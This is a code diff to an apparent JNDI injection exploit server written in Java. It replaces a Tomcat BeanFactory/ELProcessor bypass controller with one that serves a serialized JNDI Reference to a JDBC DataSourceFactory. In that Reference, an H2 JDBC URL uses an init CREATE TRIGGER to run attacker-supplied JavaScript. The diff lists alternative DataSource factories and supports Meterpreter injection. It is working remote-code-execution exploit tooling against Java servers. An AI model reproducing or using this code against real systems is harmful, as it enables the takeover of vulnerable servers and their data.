@@ -12,18 +12,21 @@ import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
-import org.apache.naming.ResourceRef;
 
 import javax.naming.StringRefAddr;
 import java.io.IOException;
 import java.lang.reflect.Field;
+import javax.naming.Reference;
+import javax.naming.StringRefAddr;
 
 import static org.fusesource.jansi.Ansi.ansi;
 
+@LdapMapping(uri = {"/tomcatjdbc"})
+public class TomcatJdbcController implements LdapController {
 
-@LdapMapping(uri = {"/tomcatbypass"})
-public class TomcatBypassController implements LdapController {
     private String     payloadType;
+
+    private String     factoryType;
     private String[]   params;
     private GadgetType gadgetType;
 
@@ -32,12 +35,18 @@ public class TomcatBypassController implements LdapController {
         try {
             System.out.println(ansi().render("@|green [+] Sending LDAP ResourceRef result for|@" + base + "  @|green with javax.el.ELProcessor payload|@"));
             System.out.println("-------------------------------------- JNDI Local  Refenrence Links --------------------------------------");
-            Entry e = new Entry(base);
-            e.addAttribute("javaClassName", "java.lang.String");
-            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
-            ref.add(new StringRefAddr("forceString", "x=eval"));
-            TomcatBypassHelper helper = new TomcatBypassHelper();
-            String             code   = null;
+
+            // create a TeraDataSource object, holding  our JDBC string
+            // org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory
+            // org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory
+            // org.apache.commons.dbcp2.BasicDataSourceFactory
+            // org.apache.commons.dbcp.BasicDataSourceFactory
+            // com.alibaba.druid.pool.DruidDataSourceFactory
+            // org.apache.tomcat.jdbc.pool.DataSourceFactory
+            Entry                                   e      = new Entry(base);
+            Reference                               ref    = new Reference("javax.sql.DataSource", "org.apache.tomcat.jdbc.pool.DataSourceFactory", null);
+            TomcatJdbcController.TomcatBypassHelper helper = new TomcatJdbcController.TomcatBypassHelper();
+            String                                  code   = null;
 
             if (payloadType.contains("E-")) {
                 String      ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
@@ -60,13 +69,17 @@ public class TomcatBypassController implements LdapController {
                 code = helper.injectMeterpreter();
             }
 
-            String payloadTemplate = "{" +
-                    "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
-                    ".newInstance().getEngineByName(\"JavaScript\")" +
-                    ".eval(\"{replacement}\")" +
-                    "}";
-            String finalPayload = payloadTemplate.replace("{replacement}", code);
-            ref.add(new StringRefAddr("x", finalPayload));
+            String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
+                    "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
+                    "{replacement}\n" +
+                    "$$\n";
+            String JDBC_URL1 = JDBC_URL.replace("{replacement}", code);
+            ref.add(new StringRefAddr("driverClassName","org.h2.Driver"));
+            ref.add(new StringRefAddr("url",JDBC_URL1));
+            ref.add(new StringRefAddr("username","root"));
+            ref.add(new StringRefAddr("password","password"));
+            ref.add(new StringRefAddr("initialSize","1"));
+            e.addAttribute("javaClassName", "java.lang.String");
             e.addAttribute("javaSerializedData", Util.serialize(ref));
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
@@ -92,13 +105,23 @@ public class TomcatBypassController implements LdapController {
             }
 
             int thirdIndex = base.indexOf("/", secondIndex + 1);
+            if (thirdIndex < 0) thirdIndex = base.length();
 
-            if (thirdIndex != -1) {
-                if (thirdIndex < 0) thirdIndex = base.length();
+            try {
+                factoryType = base.substring(secondIndex + 1, thirdIndex);
+                System.out.println(ansi().render("@|green [+] FactoryType : |@" + factoryType));
+            } catch (IllegalArgumentException e) {
+                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(fistIndex + 1, secondIndex));
+            }
+
+            int fourthIndex = base.indexOf("/", thirdIndex + 1);
+
+            if (fourthIndex != -1) {
+                if (fourthIndex < 0) fourthIndex = base.length();
                 try {
-                    gadgetType = GadgetType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
+                    gadgetType = GadgetType.valueOf(base.substring(thirdIndex + 1, fourthIndex).toLowerCase());
                 } catch (IllegalArgumentException e) {
-                    throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(secondIndex + 1, thirdIndex));
+                    throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(thirdIndex + 1, fourthIndex));
                 }
             }
 
